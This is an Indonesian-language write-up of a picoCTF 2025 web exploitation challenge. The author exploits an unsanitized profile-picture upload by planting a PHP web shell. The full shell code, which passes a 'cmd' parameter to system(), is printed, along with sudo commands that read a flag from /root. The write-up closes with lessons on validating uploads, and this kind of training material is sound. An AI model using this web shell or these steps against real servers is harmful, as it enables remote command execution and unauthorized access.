# n0s4n1ty 1

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2025 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Easy |
| Status | Solved |

## Deskripsi

Challenge ini menyediakan fitur upload foto profil pada sebuah website. Berdasarkan
deskripsi challenge, implementasi upload tersebut memiliki kelemahan. Tujuannya adalah
menemukan area upload, mendapatkan akses ke halaman web yang diunggah, lalu mencari flag
tersembunyi di direktori `/root`.

## Informasi Awal

Challenge menampilkan instance berikut:

```text
http://standard-pizzas.picoctf.net:52296
```

Halaman awal menyediakan input file dan tombol `Upload Profile`. Challenge juga memberikan
dua hint:

- `File upload was not sanitized`
- `Whenever you get a shell on a remote machine, check sudo -l`

Setelah file diunggah, aplikasi menampilkan path file di bawah direktori `uploads/`.

## Tools

- Firefox
- Terminal Linux
- GNU nano

## Analisis

Hint pertama menunjukkan bahwa ekstensi atau isi file upload tidak divalidasi dengan benar.
File PHP dapat dibuat lalu diunggah menggunakan form foto profil. Respons upload
menunjukkan bahwa file `nosanity.php` disimpan sebagai `uploads/nosanity.php`.

Ketika path tersebut dibuka melalui browser, halaman menyediakan input `cmd` dan tombol
`Execute`. Ini membuktikan bahwa file PHP di dalam direktori upload diproses oleh server dan
memungkinkan perintah dikirim melalui parameter GET `cmd`.

## Langkah Penyelesaian

### 1. Membuka halaman upload

Instance challenge dibuka melalui Firefox. Halaman menampilkan form upload foto profil pada
alamat berikut:

```text
http://standard-pizzas.picoctf.net:52296
```

### 2. Menguji upload file biasa

File `images.jpeg` dipilih pada form. Setelah tombol `Upload Profile` ditekan, server
menampilkan respons:

```text
The file images.jpeg has been uploaded Path: uploads/images.jpeg
```

Respons tersebut memperlihatkan bahwa file yang diunggah disimpan di bawah direktori
`uploads/`.

### 3. Membuat file PHP

Melalui terminal, file bernama `nosanity.php` dibuat menggunakan GNU nano:

```bash
nano nosanity.php
```

File tersebut berisi handler PHP yang mengambil parameter GET `cmd` dan meneruskannya ke
fungsi `system()`. Dengan demikian, halaman dapat digunakan untuk menjalankan command yang
dikirim melalui URL.

Kode yang ditulis pada file `nosanity.php` adalah:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&81');
    }
?>
</pre>
</body>
</html>
```

### 4. Mengunggah web shell

File `nosanity.php` dipilih pada form upload dan dikirim ke server. Respons aplikasi adalah:

```text
The file nosanity.php has been uploaded Path: uploads/nosanity.php
```

Halaman hasil upload kemudian dibuka melalui path berikut:

```text
http://standard-pizzas.picoctf.net:52296/uploads/nosanity.php
```

Halaman tersebut menampilkan input command dan tombol `Execute`, sehingga file PHP berhasil
dieksekusi oleh server.

### 5. Mencari file di direktori `/root`

Command berikut dimasukkan ke input web shell:

```bash
sudo ls /root
```

URL kemudian menampilkan output:

```text
flag.txt
```

Output ini menunjukkan bahwa file `flag.txt` berada di direktori `/root`.

### 6. Membaca flag

Flag dibaca dengan command berikut:

```bash
sudo cat /root/flag.txt
```

Server menampilkan flag pada halaman web shell.

## Flag

```text
picoCTF{wh47_c4n_u_d0_wPHP_7189176f}
```

## Pembelajaran

- File upload harus memvalidasi ekstensi, MIME type, isi file, dan lokasi penyimpanan.
- Menyimpan file yang dapat dieksekusi di dalam web root dapat berubah menjadi remote command
  execution.
- Nama file dan ekstensi tidak boleh dipercaya hanya berdasarkan input dari client.
- Hint challenge menyarankan pemeriksaan hak `sudo`; pada bukti yang tersedia, command
  `sudo ls /root` dan `sudo cat /root/flag.txt` berhasil dijalankan.
